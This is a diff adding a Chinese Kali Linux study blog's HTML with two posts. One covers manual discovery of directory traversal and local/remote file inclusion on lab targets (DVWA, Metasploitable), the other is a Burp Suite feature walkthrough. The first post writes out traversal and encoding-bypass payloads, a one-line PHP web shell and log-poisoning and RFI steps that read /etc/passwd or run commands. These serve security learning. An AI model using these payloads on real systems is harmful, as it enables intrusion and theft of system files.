@@ -240,6 +240,1744 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/08/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E5%85%AD)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/01/08/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E5%85%AD)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" itemprop="url">Kali Linux笔记(四十六)：手动漏洞挖掘--目录遍历、文件包含</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-08T16:06:25+08:00">
+                2020-01-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  874 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  3 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-手动漏洞挖掘–目录遍历-文件包含"><a href="#1-手动漏洞挖掘–目录遍历-文件包含" class="headerlink" title="1. 手动漏洞挖掘–目录遍历/文件包含"></a>1. 手动漏洞挖掘–目录遍历/文件包含</h4><ul>
+<li>Directory traversal/File include（有区别/没区别）<ul>
+<li>目录权限限制不严/文件包含</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>⭐区别:
+目录遍历：操作系统内部文件
+文件包含：1.LFI包含本地文件include 
+         2.RFI远程文件包含include（php的include函数）
+▲ Directory Browser和Directory traversal/pass不同</code></pre></blockquote>
+<ul>
+<li>修改Metasploitable的配置文件，使Metasploitable出现远程文件包含漏洞<ul>
+<li><strong><code>🔺命令：sudo vi /etc/php5/cgi/php.ini</code></strong></li>
+<li>allow_url_include=On</li>
+<li><strong><code>🔺命令：sudo /etc/init.d/apache2 restart</code></strong></li>
+</ul>
+</li>
+<li>应用程序功能操作文件，限制不严时导致访问WEB目录以外的文件<ul>
+<li>读、写文件、远程执行代码</li>
+</ul>
+</li>
+<li>特征但不绝对<ul>
+<li>?page=a.php</li>
+<li>?home=b.html</li>
+<li>?file=content</li>
+</ul>
+</li>
+<li>经典测试方法<ul>
+<li>?file=../../../../../../../../etc/passwd</li>
+<li>?page=file:///etc/passwd（文件包含的话，可以直接填写绝对路径）</li>
+<li>?home=main.cgi</li>
+<li>?page=<a href="http://www.a.com/1.php（远程文件包含）" target="_blank" rel="noopener">http://www.a.com/1.php（远程文件包含）</a></li>
+<li><a href="http://1.1.1.1/../../../../../dir/file.txt" target="_blank" rel="noopener">http://1.1.1.1/../../../../../dir/file.txt</a></li>
+</ul>
+</li>
+<li>编码绕过字符过滤<ul>
+<li>“.” “%00”–空字符（绕过文件扩展名过滤）</li>
+<li>?file=a.doc%00.php</li>
+<li>使用多种编码尝试</li>
+</ul>
+</li>
+<li>不同操作系统的路径特征字符<ul>
+<li>类Unix系统（根目录:/  目录层级分隔符:/）</li>
+<li>Windows系统（C:/  \或/）</li>
+</ul>
+</li>
+<li>URL编码、双层URL编码<ul>
+<li>%2e%2e%2f        解码：../</li>
+<li>%2e%2e%5c        解码：..\</li>
+<li>%252e%252e%255c  解码：..\（双层编码，%25解码后为%）</li>
+</ul>
+</li>
+<li>Unicode/UTF-8编码<ul>
+<li>..%c0%af         解码：../</li>
+<li>..%u2216</li>
+<li>..%c1%9c         解码：..\</li>
+</ul>
+</li>
+<li>其他系统路径可能使用到的字符<ul>
+<li>file.txt…</li>
+<li>file.txt<spaces></li>
+<li>file.txt````````</li>
+<li>file.txt&lt;&lt;&lt;&gt;&gt;&gt;</li>
+<li>./././file.txt</li>
+<li>nonexistant/../file.txt（不存在的目录）</li>
+</ul>
+</li>
+<li>UNC路径（文件共享路径）<ul>
+<li>\1.1.1.1\path\to\file.txt</li>
+</ul>
+</li>
+<li>本地文件抱哈LFI（一般很难代码执行）<ul>
+<li>查看文件</li>
+<li>代码执行</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>⭐LFI的代码执行
+1.Kali开启nc侦听80端口（目标主机），发送&lt;?php echo shell_exec($_GET[&apos;cmd&apos;]);?&gt;
+2.可查看/var/log/apache2/access.log中有记录（服务器apache2日志文件）
+3.查看access.log文件www-data用户是否可以进行执行修改
+4.chmod a+rx access.log（若www-data无权限，假设可修改文件属性）
+5.chmod a+xr apache2（若www-data无权限，假设可修改文件属性）
+6.ls -ld查看权限，保证上级上上级可被www-data执行
+7.?page=/var/log/apache2/access.log（LFI本地文件包含）</code></pre></blockquote>
+<ul>
+<li>远程文件执行RFI<ul>
+<li>出现概率少于LFI，但更容易被利用</li>
+<li>测试 </li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>⭐测试远程文件包含
+1.kali本地侦听80端口（本机端口）
+2.Web page页?page=http://Kali 地址/a.php（不存在的php页面）
+3.若kali收到请求，则表示测试成功
+⭐远程文件包含
+1.Kali机子上vi 1.txt
+2.&lt;?php echo shell_exec($_GET[&apos;cmd&apos;]);?&gt;
+3.Kali机子上service apache2 start（存放在/var/www/html/）
+4.DVWA访问?page=http://kali ip地址/1.txt&amp;cmd=pwd</code></pre></blockquote>
+<ul>
+<li>DVWA的File Inclusion（low）</li>
+<li>多种绕过方法</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $file = $_GET[&apos;page&apos;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>DVWA的File Inclusion（mediaum）</li>
+<li>绕过方法:ht<a href="http://tp://dvwa/" target="_blank" rel="noopener">http://tp://dvwa/</a>….</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $file = $_GET[&apos;page&apos;];</span><br><span class="line"></span><br><span class="line">    $file = str_replace(&quot;http://&quot;,&quot;&quot;,$file);</span><br><span class="line">    $file = str_replace(&quot;https://&quot;,&quot;&quot;,$file);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>DVWA的File Inclusion（high）</li>
+<li>暂无绕过方法</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $file = $_GET[&apos;page&apos;];</span><br><span class="line"></span><br><span class="line">    if($file!=&quot;include.php&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;ERROR:File not found!&quot;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>/usr/share/wfuzz/wordlist/vulns/（Kali集成攻击向量字典）</li>
+</ul>
+<h4 id="2-手动漏洞挖掘–Cookie存在漏洞"><a href="#2-手动漏洞挖掘–Cookie存在漏洞" class="headerlink" title="2. 手动漏洞挖掘–Cookie存在漏洞"></a>2. 手动漏洞挖掘–Cookie存在漏洞</h4><ul>
+<li>代码</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$template = &apos;blue.php&apos;</span><br><span class="line">if( is_set($_COOKIE[&apos;TEMPLATE&apos;]))</span><br><span class="line">    $template = $_COOKIE[&apos;TEMPLATE&apos;]</span><br><span class="line">include (&quot;/home/users/phpguru/template/&quot;.$template)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>攻击</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /vulnerable.php HTTP/1.0</span><br><span class="line">Cookie:TEMPLATE=../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>结果</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Content=Type:text/html</span><br><span class="line">Server:Apache</span><br><span class="line"></span><br><span class="line">root:fi3sED95ibqR6:0:1:System Operator:/:/bin/ksh</span><br><span class="line">daemon:*:1:1::/tmp:</span><br><span class="line">phpguru:f8fk3j1oIf31.:182:100:Developer:/home/users/phpguru/:bin/csh</span><br></pre></td></tr></table></figure>
+
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E4%B8%89)%EF%BC%9ABurpsuite/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/01/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E4%B8%89)%EF%BC%9ABurpsuite/" itemprop="url">Kali Linux笔记(四十三)：Burpsuite</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-03T18:50:46+08:00">
+                2020-01-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2.4k 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  10 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-Burpsuite"><a href="#1-Burpsuite" class="headerlink" title="1. Burpsuite"></a>1. Burpsuite</h4><ul>
+<li>Web安全工具中的瑞士军刀</li>
+<li>统一的集成工具发现全部现代WEB安全漏洞</li>
+<li>PortSwigger公司开发（基于JAVA）<ul>
+<li>Burp Free</li>
+<li>Burp Professional</li>
+<li><a href="http://www.portswigger.net" target="_blank" rel="noopener">http://www.portswigger.net</a></li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>▲ Free版本和Professional版本之间的区别是，Free版本没有主动扫描功能</code></pre></blockquote>
+<ul>
+<li>所有的工具共享一个能处理并显示HTTP消息的可扩展框架，模块之间无缝交换信息</li>
+<li>字体（首次启动修改字体）<ul>
+<li>Options → Display → HTTP Message Dispaly → 中文字体</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-Burpsuite-Proxy"><a href="#2-Burpsuite-Proxy" class="headerlink" title="2. Burpsuite Proxy"></a>2. Burpsuite Proxy</h4><ul>
+<li>Options<ul>
+<li>Proxy Listeners（默认监听8080）</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>⭐Banding 监听的端口，可以修改IP作为代理转发   
+⭐Request handing 转发到其他主机，非真正目的地址（Redirect to host/port） 
+▲ Invisible proxy 对于客户端程序不支持代理但走HTTPS协议代理功能的程序。
+1.其原理是欺骗本机的DNS服务器，将所要发送的域名解析成Burpsuite的IP地址，然后通过Burpsuit本机的DNS服务器或者局域网内的解析成对公网的IP地址
+2.但若本机和Burpsuit在同一台机器上，会陷入欺骗，解析本地地址的死循环
+3.需要通过Options → Hostname Resolution去增加解析地址
+▲ Invisible Proxy主机头问题 
+1.When using plain HTTP,a proxy-style request looks like this:
+GET http://example.org/foo.php HTTP/1.1
+Host:example.org
+2.Whereas the corresponding non-proxy-style request looks like this:
+GET:/foo.php HTTP/1.1
+Host:example.org
+不支持代理的Web Application可能多为第二种情况的请求，不包含完整头部的HTTP头部请求，此时可开启环回网卡的Invisible Proxy功能，然后通过Redirect to host/port重定向到需要访问真正的目标地址
+▲ Invisible Proxy多目标域名问题
+可以创建多个环回网卡Lookback，监听多个端口，每个环回网卡都开启Invisible Proxy，然后通过Redirect to host/port重定向到需要访问真正的目标地址
+⭐CA certificate（导入导出）
+1.Export → certificate in DER format
+2.在Proxy情况下，访问http://burp，生成CA certificate</code></pre></blockquote>
+<ul>
+<li>Options<ul>
+<li>Intercept Client Request（默认截断）</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>▲ 默认情况下只有一条规则：File extension
+▲ 请求头发生变化：Automatically uodate Content-Length header when the request is edited</code></pre></blockquote>
+<ul>
+<li>Options<ul>
+<li>Intercept Server Responses（默认不截断）</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>默认情况下只有一条规则：Content type header</code></pre></blockquote>
+<ul>
+<li>Options<ul>
+<li>Intercept WeSockets Messages</li>
+<li>Response Modification</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>▲ 常用的Modification
+Unhide hidden from fields（显示隐藏表单）
+Enable disabled form fields（激活被禁止的表单）
+Remove input field length limits（去除输入限制长度）
+Remove JavaScript from validation（去除JavaScript的验证）
+Remove All JavaScript（去除所有的JavaScript）
+Remove secure flag from cookies（去掉cookies的安全标签）</code></pre></blockquote>
+<ul>
+<li>Options<ul>
+<li>Match and Replace（匹配和替换，Request header match就repalce）</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>▲ 提交数据的自动修改
+Original reequest 原始的请求
+Auto-modified request 修改后的请求</code></pre></blockquote>
+<ul>
+<li>Options<ul>
+<li>SSL Pass Through（加密流量直接通过，不截获代理）</li>
+</ul>
+</li>
+<li>Intercept（截断请求代理，默认不截断返回的流量）<ul>
+<li>Intercept is on（截断代理开启）</li>
+<li>Froward（单步发送信息）</li>
+<li>Drop（丢弃包数据，不发送）</li>
+</ul>
+</li>
+<li>HTTP history（截断代理历史）<ul>
+<li>Request</li>
+<li>Response</li>
+</ul>
+</li>
+<li>Web Socket history（无界面的Web Application，SOCKET长连接） </li>
+</ul>
+<h4 id="3-Burpsuite-Target"><a href="#3-Burpsuite-Target" class="headerlink" title="3. Burpsuite Target"></a>3. Burpsuite Target</h4><ul>
+<li>Site map<ul>
+<li>黑色链接：真正访问的链接/灰色链接：通过爬网爬出来的链接，无进行真正访问</li>
+<li>过滤功能：选择站点 → 右键 → Add to Scope（上方白色横条为过滤功能）</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>▲  过滤：
+过滤在Scope中的内容：Filter by request type → Show only in-scope items
+过滤真正发生请求：Filter by request type → Show only requests items
+过滤有参数的请求:Filter by request type → Show only oarameterised requests
+指定参数进行过滤：Filter by search term → 输入字符串
+过滤网页类型：Filter by MIME type
+过滤访问请求码:Filter by status code
+过滤文件扩展名：Filter by file extension
+过滤高亮显示的网页： 右键高亮选中选项（Highlight） → Filter by abotation → Show only highlighted ietms
+过滤有注释的网页：右键注释选中选项（Add Comment）→ Filter by abotation → Show only commented items</code></pre></blockquote>
+<ul>
+<li>Scope<ul>
+<li>Add to Scope会生成过滤的正则表达式</li>
+<li>Include in Scope（加入Scope）</li>
+<li>Exclude from Scope（排除Scope）</li>
+</ul>
+</li>
+</ul>
+<h4 id="4-Burpsuite-Spider-▲-2020-1-3-新版暂无此扩展"><a href="#4-Burpsuite-Spider-▲-2020-1-3-新版暂无此扩展" class="headerlink" title="4. Burpsuite Spider ▲ 2020.1.3 新版暂无此扩展"></a>4. Burpsuite Spider ▲ 2020.1.3 新版暂无此扩展</h4><ul>
+<li>手动爬网</li>
+<li>自动爬网<ul>
+<li>站点目录 → 右键 → Spider this branch</li>
+</ul>
+</li>
+<li>Control<ul>
+<li>Spider Status（Spider is pause自动爬网暂停/Clear queues清理要爬网队列）</li>
+</ul>
+</li>
+<li>Options<ul>
+<li>Application Login（Prompt for guidance提示）</li>
+<li>Passive Spidering（对手动爬网进行分析）</li>
+<li>Request Headers（请求头格式）</li>
+</ul>
+</li>
+<li>比较不同账号或配置，爬网的内容<ul>
+<li>站点目录 → 右键 → Compare site map</li>
+<li>Use current site map（Site map 1）</li>
+<li>Use all items with resposes/Include in-scope items only</li>
+<li>Load from Burp state file（Site map 2）</li>
+<li>Use all items with resposes/Include in-scope items only</li>
+<li>Request Matching（可以默认）</li>
+<li>Response Comparation（可以默认）</li>
+<li>Sync selection（同步两次选中）</li>
+</ul>
+</li>
+</ul>
+<h4 id="5-Burpsuite-Scanner-▲-2020-1-3-新版暂无此扩展"><a href="#5-Burpsuite-Scanner-▲-2020-1-3-新版暂无此扩展" class="headerlink" title="5. Burpsuite Scanner ▲ 2020.1.3 新版暂无此扩展"></a>5. Burpsuite Scanner ▲ 2020.1.3 新版暂无此扩展</h4><ul>
+<li>主动扫描：站点目录 → 右键 → Actively scan this branch</li>
+<li>Options<ul>
+<li>Attack Insertion Points</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>⭐Place attacks into the following location within requests:
+1.URL parameter values
+2.Body parameter values
+3.Cookies parameter values
+4.parameter name
+5.HTTP headers
+6.AMF string parameter（Adobe Flash脚本注入）
+7.REST-STYLE URL parameters
+⭐Change parameter locations（causes many more scan requests）:
+⭐Skip all tests for these parameters（Add）</code></pre></blockquote>
+<ul>
+<li>Options<ul>
+<li>Active Scanning Engine（主动扫描）</li>
+<li>Active Scanning Optimization（主动扫描选项：Speed（扫描速度）/accuracy（准确性））</li>
+<li>Actvie Scanning Areas（主动扫描类型，默认全选）</li>
+<li>Passive Scanning Areas（被动扫描类型，默认全选）</li>
+</ul>
+</li>
+<li>Scan queue（扫描队列）</li>
+<li>Results（扫描结果）</li>
+</ul>
+<h4 id="6-Burpsuite-Extender"><a href="#6-Burpsuite-Extender" class="headerlink" title="6. Burpsuite Extender"></a>6. Burpsuite Extender</h4><ul>
+<li>BApp Store（商店扩展）</li>
+<li>Entensions（安装的扩展）▲ jython（java访问python的中间组件）</li>
+<li>Options<ul>
+<li>Python Environment/jython Standalone Jar（<a href="http://www.jython.og/downloads.html）" target="_blank" rel="noopener">http://www.jython.og/downloads.html）</a></li>
+<li>cp jython Standalone Jar /root/Desktop</li>
+<li>推荐j2EEScan、CO2（图形化SQLMap）插件</li>
+</ul>
+</li>
+</ul>
+<h4 id="7-Burpsuite-Intruder"><a href="#7-Burpsuite-Intruder" class="headerlink" title="7. Burpsuite Intruder"></a>7. Burpsuite Intruder</h4><ul>
+<li>选取爬取的站点选项Request右键 → Send to Intrude（发送模块）</li>
+<li>Positiors<ul>
+<li>Attcak type</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>⭐Attcak type攻击类型（n比m大）
+1.Sniper：先在第一个变量位置逐一插入，第二个位置不变；再在第二个变量位置逐一插入，第一个变量的位置不变（从指定的字典进行破解，只需要一个字典，总替换次数为m+n次）
+2.Battering ram：在变量的位置上，都放上同样的值，变量上的值是一样的（从指定的字典进行破解，只需要一个字典，总替换次数为m+n次）
+3.Pitchfork：从两个字典中各取出同序号的项目放入到变量的位置，若有一个字典的值结束，则此次破解结束（从指定的字典进行破解，需要两个字典，总替换次数为n次）
+4.Cluster bomb：从第一个字典的第一项开始，尝试第二个字典的所有选项，再从第一个字典的第二项开始，尝试第二个字典的所有选项，以此类推（从指定的字典进行破解，需要两个字典，总替换次数为m*n次）</code></pre></blockquote>
+<ul>
+<li>Positiors<ul>
+<li>打上$$作为变量</li>
+<li>Clear $</li>
+<li>选择变量Add $$</li>
+<li>指定Attcak typ以及字典</li>
+</ul>
+</li>
+<li>Payloads<ul>
+<li>Payload Sets（字典类型）</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>⭐Payload Sets:
+1.Simple list 简单字典
+2.Runtime file 指定字典文件路径
+3.Case modification 大小写的替换
+4.Character blocks 字符块
+5.Number 数字
+6.Datas 日期
+7.Brute force 暴力破解（Character set）
+8.Username generator 用户名生成器（Add fanghong:yuan）
+9.Copy other payload 复制字典文件</code></pre></blockquote>
+<ul>
+<li>Payloads<ul>
+<li>Payload Options【Payload Sets】（选择密码字典文件）</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>⭐Add from list:
+1.Fuzzing-full 常用fuzz字典</code></pre></blockquote>
+<ul>
+<li>Payloads<ul>
+<li>Payload Processing（对Payload进行加工）</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>⭐Add:
+1.Add prefix 添加字典前缀
+2.Add suiffix 添加字典后缀
+3.Match/replace 匹配就替换
+4.Reverse substring 反转字符串
+5.Modify case 修改大小写
+6.Encode 编码
+7.Decode 解码
+8.Hash 哈希</code></pre></blockquote>
+<ul>
+<li>Payloads<ul>
+<li>Payload Encoding（URL-encode these character编码字符）</li>
+</ul>
+</li>
+<li>Options<ul>
+<li>Grap Match（Add Match，默认是Exclude HTTP header，需要去除）</li>
+</ul>
+</li>
+<li>在指定完所有的Intrude选项后，开始Intrude<ul>
+<li>顶部 → Intruder → Start attack</li>
+<li>可选择上方白色横条进行filter/或通过Options中的Grap Match进行匹配</li>
+<li>▲ 基于此项Intruder功能，可以进行页面存在性的Fuzz（指定字典）</li>
+</ul>
+</li>
+</ul>
+<h4 id="8-Burpsuit-Repeater"><a href="#8-Burpsuit-Repeater" class="headerlink" title="8. Burpsuit Repeater"></a>8. Burpsuit Repeater</h4><ul>
+<li>站点目录网页 → 右键 → Send to Repeater</li>
+<li>重放：Request → Go → Response</li>
+<li>更改请求方式：Request/Raw → 右键 → Change request method</li>
+<li>更改body编码：Request/Raw → 右键 → Change body encoding</li>
+<li>转换为curl命令形式：Request/Raw → 右键 → Copy as curl command</li>
+<li>如果为CSRF漏洞存在页面（Request/Raw → 右键）<ul>
+<li>Generate CSRF Poc（生成一份Poc代码文件）</li>
+</ul>
+</li>
+<li>菜单栏 → Reperter<ul>
+<li>Update Content-Length（默认自动调整）</li>
+<li>Unpack gzip/deflate（默认自动解压）</li>
+<li>Follow redirections（重定向）</li>
+<li>Process cookies in redirections（处理Cookies重定向，带取Cookie）</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>⭐Follow redirections:
+1.Never 不跟随重定向（默认）
+2.One-site only 一个站点重定向
+3.In-scope only 一个scope重定向
+4.Always 总是重定向</code></pre></blockquote>
+<h4 id="9-Burpsuit-Sequence"><a href="#9-Burpsuit-Sequence" class="headerlink" title="9. Burpsuit Sequence"></a>9. Burpsuit Sequence</h4><ul>
+<li>删除浏览器的Cookies信息（抓取生成Cookies的过程）</li>
+<li>站点目录网页 → 右键 → Send to Sequence</li>
+<li>Token Location Within Response（令牌选择）<ul>
+<li>如果自动识别：Cookies保存在Cookie中</li>
+<li>如果未自动识别：可通过Custom location进行手动选择序列</li>
+</ul>
+</li>
+<li>Select Live Capture Request<ul>
+<li>Start live caputre（不断请求服务器，请求新生成SessionID进行分析）</li>
+<li>收集SessionID → Analyze now </li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>⭐Analyze（伪随机算法的分析）
+1.Summary → Overall result
+2.Character-level analysis 基于字符层面的分析
+3.Bit-level analysis 基于位层面的分析
+▲ FIPS--美国联邦信息处理标准（Federal Information Processing Standard）</code></pre></blockquote>
+<h4 id="10-Burpsuit-Encode-Decode"><a href="#10-Burpsuit-Encode-Decode" class="headerlink" title="10. Burpsuit Encode/Decode"></a>10. Burpsuit Encode/Decode</h4><ul>
+<li>多层复杂编码，可以绕过过滤机制</li>
+<li>Smart decode（只能解码）</li>
+</ul>
+<h4 id="11-Burpsuit-Compare"><a href="#11-Burpsuit-Compare" class="headerlink" title="11. Burpsuit Compare"></a>11. Burpsuit Compare</h4><ul>
+<li>同之前的Compare</li>
+</ul>
+<h4 id="12-Burpsuit-Options"><a href="#12-Burpsuit-Options" class="headerlink" title="12. Burpsuit Options"></a>12. Burpsuit Options</h4><ul>
+<li>Connections<ul>
+<li>Platform Authentication（表单/Http身份认证等其他认证）</li>
+<li>Upstream Proxy Servers（上游代理服务器）</li>
+<li>SOCKS proxy</li>
+<li>Timeouts（超时时间）</li>
+</ul>
+</li>
+<li>HTTP</li>
+<li>SSL<ul>
+<li>Client SSL Certificates（Web Application需要客户端证书，比如软银）</li>
+<li>Server SSL Certificates（服务器代理，导入证书）</li>
+</ul>
+</li>
+<li>Sessions</li>
+<li>Dispaly</li>
+<li>Misc<ul>
+<li>Logging（记录所有操作过程）</li>
+<li>Scheduled Tasks（定期日期表）</li>
+</ul>
+</li>
+</ul>
+<h4 id="13-Burpsuit-Alerts"><a href="#13-Burpsuit-Alerts" class="headerlink" title="13. Burpsuit Alerts"></a>13. Burpsuit Alerts</h4><h4 id="14-截断代理工具"><a href="#14-截断代理工具" class="headerlink" title="14. 截断代理工具"></a>14. 截断代理工具</h4><ul>
+<li>Paros（最早的截断代理工具）</li>
+<li>Webscrab</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/29/Kali%20linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E4%B8%80)%EF%BC%9AArachni/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
